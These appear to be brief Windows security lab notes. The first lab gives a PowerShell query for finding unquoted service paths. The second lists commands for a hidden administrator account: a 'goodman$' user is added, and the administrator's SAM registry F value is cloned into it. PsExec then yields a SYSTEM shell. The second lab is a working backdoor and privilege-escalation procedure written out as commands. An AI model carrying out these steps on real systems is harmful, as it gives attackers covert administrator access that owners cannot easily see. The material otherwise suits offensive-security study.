# Lab2
---
## Lab 2-1 find the unquoated service
- get-wmiobject win32_service | ?{$_.pathname -match"^`"{0,1}(C|c):*\\.*\s+.*\\.*"} | select Name, Pathname, State, ProcessID
- get-acl

## Lab2-2 Hidden account
1. net user goodman$ \<passwd\> /add
1. Export regedit 
    1. sam\domains\account\users\names\goodman$ as name.reg
    1. sam\domains\account\users\\<admimistratorID\> as source.reg
    1. sam\domains\account\users\\<goodman$ID> as target.reg
1. Delete goodman$ account
1. Copy F=hex value from source.reg to target.reg
1. Import name and target reg
    1. regedit /s \<xxx\>.reg
1. Us PSexec to get system cmd
    1. psexec -u hidden$ -p \<passwd\> cmd
    1. psexec -i-s cmd
